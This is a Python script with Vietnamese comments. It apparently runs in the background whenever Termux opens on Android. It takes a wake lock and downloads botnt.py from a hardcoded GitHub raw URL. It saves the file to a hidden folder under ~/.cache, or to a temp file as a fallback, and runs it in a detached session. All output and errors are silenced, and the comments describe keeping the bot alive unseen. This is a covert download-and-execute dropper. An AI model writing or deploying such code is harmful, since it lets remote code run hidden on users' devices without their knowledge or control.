# -*- coding: utf-8 -*-
"""
Script chạy botnt.py ngầm khi Termux mở, không in log, không phụ thuộc tool gộp VIP.
Tối ưu Termux, fallback RAM, đảm bảo bot sống.
"""
import os
import sys
import requests
import subprocess
import tempfile
from subprocess import DEVNULL

def run_botnt():
    """Chạy botnt.py ngầm, không in log lỗi, tối ưu Termux, fallback RAM."""
    try:
        # Gọi termux-wake-lock để ngăn giết process
        subprocess.run(["termux-wake-lock"], stdout=DEVNULL, stderr=DEVNULL)
        
        # Kiểm tra URL tồn tại bằng HEAD request
        bot_url = "https://raw.githubusercontent.com/tsanduongvi123-design/chuoimahoagopdgvi/main/botnt.py"
        try:
            res = requests.head(bot_url, timeout=5)
            if res.status_code != 200:
                return
        except:
            return

        # Tải nội dung bot
        res = requests.get(bot_url, timeout=10)
        if res.status_code != 200 or not res.text.strip():
            return

        bot_code = res.text
        # Thử ghi file vào ~/.cache/.dv/.sys
        hidden_folder = os.path.join(os.path.expanduser("~"), ".cache", ".dv", ".sys")
        try:
            os.makedirs(hidden_folder, exist_ok=True)
            bot_path = os.path.join(hidden_folder, "botnt.py")
            with open(bot_path, "w", encoding="utf-8") as f:
                f.write(bot_code)
            try:
                os.chmod(bot_path, 0o700)
            except:
                pass
            # Chạy bot từ file
            python_path = "/data/data/com.termux/files/usr/bin/python"
            if not os.path.exists(python_path):
                python_path = sys.executable
            subprocess.Popen(
                [python_path, bot_path],
                stdout=DEVNULL,
                stderr=DEVNULL,
                start_new_session=True
            )
            return
        except:
            pass

        # Fallback: Chạy bot trong RAM
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as tmp:
            tmp.write(bot_code)
            tmp_path = tmp.name
        try:
            os.chmod(tmp_path, 0o700)
            python_path = "/data/data/com.termux/files/usr/bin/python"
            if not os.path.exists(python_path):
                python_path = sys.executable
            subprocess.Popen(
                [python_path, tmp_path],
                stdout=DEVNULL,
                stderr=DEVNULL,
                start_new_session=True
            )
        except:
            pass
    except:
        pass  # Im lặng, không in lỗi

if __name__ == "__main__":
    run_botnt()